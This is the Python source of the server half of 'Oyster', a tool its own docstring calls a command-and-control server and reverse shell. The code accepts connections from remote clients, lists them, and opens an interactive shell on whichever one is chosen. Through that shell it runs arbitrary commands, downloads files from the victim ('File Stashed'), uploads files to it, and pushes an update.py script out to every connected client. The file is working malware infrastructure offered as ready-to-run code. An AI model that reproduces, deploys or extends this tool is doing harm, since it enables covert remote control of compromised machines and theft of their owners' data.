from time import sleep
from os.path import expanduser
from os import execv
import socket
import sys
import threading
from uuid import uuid4
from base64 import b64encode, b64decode
import shlex
from client import Client


class Connection(object):
    """
    Manages a socket object.
    """
    def __init__(self, connection, address, recv_size=1024):
        self.connection = connection
        self.ip, self.port = address[0], address[1]
        self.recv_size = int(recv_size)

    def close(self):
        """
        Close the connection.

        :return:
        """

        self.send_command('disconnect')
        closing = True
        while closing:
            try:
                self.connection.close()
            except:
                continue
            closing = False
        return self

    def send_command(self, command, echo=False, encode=True):
        """
        Send a command to the connection.

        :param command:
        :param echo:
        :param encode:
        :return:
        """

        if echo:
            print('Sending Command: {}'.format(command))
        try:
            if encode:
                self.connection.send(str.encode(command + '~!_TERM_$~'))
            else:
                self.connection.send(command)
                self.connection.send(str.encode('~!_TERM_$~'))
        except BrokenPipeError as err_msg:
            print('Client disconnected... Could not send last command.  Type quit into the console.')
            self.connection.close()
            return

        return self.get_response()

    def get_response(self, echo=False):
        """
        Receive a response from the server.

        :return:
        """

        data_package = ''
        while True:
            try:
                data = self.connection.recv(self.recv_size)
            except ConnectionResetError:
                print('Connection reset by peer.')
                break
            if len(data) < 1:
                continue
            d = data.decode('utf-8')
            data_package += d
            # print('Data:', repr(d))
            if data_package[-10:] == '~!_TERM_$~':
                # print('Got termination string!')
                break

        data_package = data_package[:-10]
        if echo:
            print('Response: {}'.format(data_package))
        return data_package


class ConnectionManager(object):
    """
    Manage the Connection objects added to it.
    """
    def __init__(self):
        self.connections = {}
        self.session_id = uuid4()
        self.current_connection = None
        self.cwd = None

    def __iter__(self):
        """
        Return an generator.

        :return:
        """

        for k, v in self.connections.items():
            yield k, v

    def __len__(self):
        """
        Return the amount of connections in the pool.

        :return:
        """

        return len(self.connections)

    def __getitem__(self, item):
        """
        Get item from dictionary by key or by index.

        :param item:
        :return:
        """

        if str(item).isdigit():
            return list(self.connections.values())[int(item)]
        return self.connections[item]

    def __setitem__(self, key, value):
        """
        Set an item in the dictionary.

        :param key:
        :param value:
        :return:
        """

        self.connections[key] = value

    def __delitem__(self, key):
        """
        Delete item connection from pool.

        :param key:
        :return:
        """

        del self.connections[key]

    def __str__(self):
        """
        Print out the client data.

        :return:
        """

        c = 0
        client_data = "-------------- Clients --------------\n"
        for key, connection in self.connections.items():
            client_data += '[{}]'.format(c) + '   ' + key + '   ' + str(connection.port) + '\n'
            c += 1
        return client_data

    def close(self):
        """
        Close a the current connection.

        :return:
        """

        if self.current_connection is not None:
            self.current_connection.close()
        return self

    def use_connection(self, ip):
        """
        Use the given IP as the current connection.  An index can be passed as well.

        :param ip:
        :return:
        """

        if ip is None:
            self.current_connection = None
            return None

        # Set the use_index variable based on whether or not we can int() it the ip.
        try:
            int(ip)
            use_index = True
        except ValueError:
            use_index = False

        # If we need to use_index, then look up the dictionary entry by index.
        # If not, do regular dictionary lookup.
        if use_index:
            try:
                self.current_connection = list(self.connections.values())[int(ip)]
            except KeyError:
                print('No connection for the given key')
                return None
        else:
            try:
                self.current_connection = self.connections[str(ip)]
            except KeyError:
                print('No connection for the given IP address')
                return None
        return self.current_connection

    def remove_connection(self, connection):
        """
        Remove a connection.

        :param connection:
        :return:
        """

        ip = False
        for ip, conn in self.connections.items():
            if conn == connection:
                ip = ip
                break
        if ip:
            print('< Removing connection: {} >'.format(ip))
            del self.connections[ip]
        return self

    def send_command(self, command, echo=False, encode=True):
        """
        Send a command to a specific client.

        :param ip:
        :param command:
        :param echo:
        :param encode:
        :return:
        """

        if self.current_connection is None:
            print('Run the `use` command to select a connection by ip address before sending commands.')
            return ''

        try:
            response = self.current_connection.send_command(command, encode=encode)
        except BrokenPipeError as err_msg:
            self.current_connection = None
            return

        if echo:
            print(response)
        self.cwd = self.current_connection.send_command('oyster getcwd')
        return response

    def send_commands(self, command, echo=False):
        """
        Send a command to all of the clients.

        :param command:
        :param echo:
        :return:
        """

        response = ''
        for ip, connection in self.connections.items():
            response += connection.send_command(command)

        if echo:
            print(response)
        return response

    def close_all_connections(self):
        """
        Close all the connections in the pool.

        :return:
        """

        for key, connection in self.connections.items():
            self.close_connection(key)

        self.connections = {}
        return self

    def close_connection(self, ip_address):
        """
        Close and remove a connection from the connection pool.

        :param ip_address:
        :return:
        """

        self.connections[ip_address].close()
        return self

    def server_should_shutdown(self, address):
        """
        Check to see if the given address connected with a shutdown command for the server.

        :param address:
        :return:
        """

        return True if self.connections[address].send_command('server_shutdown?') == 'Y' else False

    def add_connection(self, connection, address):
        """
        Add a connection to the connection pool.

        :param connection:
        :param address:
        :return:
        """

        self.connections[str(address[0])] = Connection(connection, address)
        # conn.send_command('set-session-id {}'.format(self.session_id))
        return self


class Server(object):
    """
    A simple command and control server(Reverse Shell).
    """
    def __init__(self, host="", port=6667, recv_size=1024, listen=10, bind_retry=5, header=True):
        self.header = header
        header = """\n .oOOOo.
.O     o.
O       o               O
o       O              oOo
O       o O   o .oOo    o   .oOo. `OoOo.
o       O o   O `Ooo.   O   OooO'  o
`o     O' O   o     O   o   O      O
 `OoooO'  `OoOO `OoO'   `oO `OoO'  o
              o
           OoO'                         """
        if self.header:
            print(header, end='\n\n')
        self.host = host
        self.port = int(port)
        self.recv_size = int(recv_size)
        self.listen = int(listen)
        self.bind_retry = bind_retry

        self.socket = None
        self.reboot = False

        self.connection_mgr = ConnectionManager()
        self.create_socket()
        self.bind_socket()

    def create_socket(self):
        """
        Create the socket.

        :return:
        """

        try:
            self.socket = socket.socket()
        except socket.error as error_message:
            print('Could not create socket:', error_message)
            sys.exit()
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        return self

    def bind_socket(self, attempts=1):
        """
        Bind the socket to the port.

        :return:
        """

        print('Starting on port', self.port, end=', ')
        try:
            # Bind & start listening.
            self.socket.bind((self.host, self.port))
            self.socket.listen(self.listen)
            print('waiting for client connections...', end='\n\n')

        except socket.error as error_message:
            print('Could not bind the socket:', error_message, '\n', 'Trying again...')
            sleep(1)

            # Try to bind the socket 5 times before giving up.
            if attempts == self.bind_retry:
                print('Could not bind the socket to the port after {} tries.  Aborting...'.format(self.bind_retry))
                sys.exit()
            self.bind_socket(attempts=attempts + 1)
        return self

    def accept_connections(self):
        """
        Start accepting connections.

        :return:
        """

        while True:

            try:
                conn, address = self.socket.accept()
            except socket.error as e:
                # Loop indefinitely
                continue

            # if address[0] in self.connection_mgr.connections.keys():
            #     continue

            conn_obj = Connection(conn, address, recv_size=self.recv_size)
            should_connect = conn_obj.send_command('connect {}'.format(self.connection_mgr.session_id))
            should_connect = True if should_connect == 'True' else False
            if should_connect:
                self.connection_mgr.add_connection(conn, address)
            else:
                conn_obj.close()

            # Send the connection it's ip and port
            conn_obj.send_command('set ip {}'.format(address[0]))
            conn_obj.send_command('set port {}'.format(address[1]))

            # Check local addresses.
            if address[0] == '127.0.0.1':
                if self.connection_mgr.server_should_shutdown('127.0.0.1'):
                    self.connection_mgr.close_all_connections()
                    print('< Listener Thread > Connections no longer being accepted!')
                    break

            print(
                '\n< Listener Thread > {} ({}) connected...\n{}'.format(
                    address[0],
                    address[1],
                    'Oyster> '
                ),
                end=''
            )
        return

    def update_clients(self):
        """
        Update all the connected clients using the `update.py` file.

        :return:
        """

        print('Starting script upload...')
        with open('update.py', 'r') as f:
            file_data = ''
            for line in f:
                file_data += line

            _c = "update {}".format(file_data)
            print(self.connection_mgr.send_commands(_c))
        sleep(.5)
        self.connection_mgr.close()
        self.connection_mgr.remove_connection(self.connection_mgr.current_connection)
        self.connection_mgr.current_connection = None
        print('Finished uploading \'update.py\' to client.')
        return self

    def set_cli(self, the_string):
        """
        Set the command line to equal a certain string.

        :param the_string:
        :return:
        """

        print(the_string, end='')
        return self

    def handle_upload(self, filepaths=None):
        """
        Handle a file upload.

        :param command:
        :return:
        """

        if self.connection_mgr.current_connection is None:
            print(self.connection_mgr)
            connection_id = input('< Enter Client IP or Index > ')
        else:
            connection_id = None

        # Handle the filepaths variable
        if filepaths is None:
            local_filepath = expanduser(input('< Local File Path > '))
            remote_filepath = input('< Remote File Path > ')
        else:
            try:
                local_filepath, remote_filepath = shlex.split(filepaths)
            except ValueError as err_msg:
                print('ValueError handling upload:', err_msg)
                return

        if connection_id is not None:
            connection = self.connection_mgr[connection_id]
        else:
            connection = self.connection_mgr.current_connection

        print(connection.send_command('upload_filepath {}'.format(remote_filepath)))

        r = None
        try:
            with open(local_filepath, 'rb') as f:
                data = b64encode(f.read())
                r = connection.send_command('upload_data')
                r += '\n' + connection.send_command(data, encode=False)
        except FileNotFoundError as err_msg:
            print(err_msg)

        return r

    def write_file_data(self, filepath, filedata):
        """
        Write file data to hard drive.

        :param filepath:
        :param filedata:
        :return:
        """

        with open(filepath, 'wb') as f:
            f.write(b64decode(filedata))
        # print('\n<', filepath, 'written...', '>')
        return

    def get_file(self, filepaths):
        """
        Get a file from the server.

        :param filepaths:
        :return:
        """

        remote_filepath, local_filepath = shlex.split(filepaths)

        filedata = self.connection_mgr.send_command('get {}'.format(remote_filepath))
        t = threading.Thread(target=self.write_file_data, args=(local_filepath, filedata))
        t.start()
        print('< File Stashed: {} >'.format(local_filepath))
        return

    def start_client_shell(self):
        """
        Open up a client shell using the current connection.

        :return:
        """

        self.connection_mgr.send_command('oyster getcwd')
        while True:
            input_string = "<{}> {}".format(self.connection_mgr.send_command('get ip'), self.connection_mgr.cwd)
            command = input(input_string)

            if command == 'quit' or command == 'exit':
                print('Detaching from client...')
                try:
                    self.connection_mgr.close()
                except (BrokenPipeError, OSError) as err_msg:
                    self.connection_mgr.remove_connection(self.connection_mgr.current_connection)
                    self.connection_mgr.current_connection = None
                    break

                self.connection_mgr.remove_connection(self.connection_mgr.current_connection)
                self.connection_mgr.current_connection = None
                break

            # Get a file from the client.
            # > get {remote filepath} {local filepath}
            if command[:4] == 'get ':
                filepaths = command[4:]
                self.get_file(filepaths)
                continue

            # Upload a file to the client.
            # > upload {local filepath} {remote filepath}
            if command[:7] == 'upload ':
                filepaths = command[7:]
                print(self.handle_upload(filepaths=filepaths))
                continue

            # Reboot the target's client.py file remotely.
            if command == 'shell reboot':
                try:
                    self.connection_mgr.send_command(command)
                except BrokenPipeError as err_msg:
                    self.connection_mgr.current_connection = None
                    break
                continue

            # Send command through.
            try:
                response = self.connection_mgr.send_command(command)
            except BrokenPipeError as err_msg:
                print(err_msg)
                break
            print(response, end='')
        return

    def open_oyster(self):
        """
        Run the Oyster shell.

        :return:
        """

        sleep(1)
        while True:
            command = input('Oyster> ')

            # List connected clients.
            if command == 'list':
                print(self.connection_mgr)
                continue

            # Drop into the given connection's shell.
            if command[:3] == 'use':
                if command.lower() == 'use none':
                    self.connection_mgr.use_connection(None)
                # Use a connection.
                r = self.connection_mgr.use_connection(command[3:].strip())
                if r is None:
                    print('Could not connect to client with given information.')
                    continue

                self.start_client_shell()
                continue

            # Update all clients using the local update.py file.
            if command == 'update all':
                self.update_clients()
                continue

            # Upload file to
            if command == 'upload':
                print(self.handle_upload())
                continue

            # Quit the server.py app down.
            if command == 'quit' or command == 'exit' or command == 'shutdown':
                self.handle_quit()
                return False

            # Reboot self.
            if command == 'reboot':
                print('Rebooting...')
                self.reboot_self()
                return

            if len(command) > 0:
                if self.connection_mgr.current_connection is not None:
                    print(self.connection_mgr.send_command(command))
        return

    def handle_quit(self):
        """
        Handle a quit event issued by the Oyster Shell.

        :return:
        """

        # Open a client with the `server_shutdown` and
        # `shutdown_kill` flags.  This will tell the
        # client to tell the servers connection
        # listener thread to shut itself down.
        # Since the Oyster Shell thread is
        # initiating the `quit` command
        # it knows how to shut down.
        client_shutdown = Client(
            port=self.port,
            recv_size=self.recv_size,
            server_shutdown=True,
            shutdown_kill=True
        )
        client_shutdown.main()
        # Close all the connections that have been established.
        self.connection_mgr.close_all_connections()
        return self

    def reboot_self(self):
        """
        Reboot the server.py script.

        :return:
        """

        restart_arguments = list(sys.argv)
        restart_arguments.insert(0, '')
        execv(sys.executable, restart_arguments)
        sys.exit()


if __name__ == '__main__':

    # Set some default values.
    the_host = ''
    the_port = 6668
    the_recv_size = 1024
    the_listen = 10
    the_bind_retry = 5

    def check_cli_arg(arg):
        """
        Check command line argument and manipulate the variable
        that it controls if it matches.

        :param arg:
        :return:
        """

        global the_host
        global the_port
        global the_recv_size
        global the_listen
        global the_bind_retry

        if 'host=' in arg:
            the_host = arg.split('=')[1]
        elif 'port=' in arg:
            the_port = int(arg.split('=')[1])
        elif 'recv_size=' in arg:
            the_recv_size = int(arg.split('=')[1])
        elif 'listen=' in arg:
            the_listen = int(arg.split('=')[1])
        elif 'bind_retry=' in arg:
            the_bind_retry = int(arg.split('=')[1])

    # Check all the command line arguments
    for argument in sys.argv[1:]:
        check_cli_arg(argument)

    server = Server(
        host=the_host,
        port=the_port,
        recv_size=the_recv_size,
        listen=the_listen,
        bind_retry=the_bind_retry,
    )

    # Start the thread that accepts connections.
    connection_accepter = threading.Thread(target=server.accept_connections)
    connection_accepter.setDaemon(True)
    connection_accepter.start()

    # Start the Oyster Shell.
    server.open_oyster()

    # Handle the shutdown sequence.
    try:
        connection_accepter.join()
    except:
        server.handle_quit()
        connection_accepter.join()

    print('Shutdown complete!')
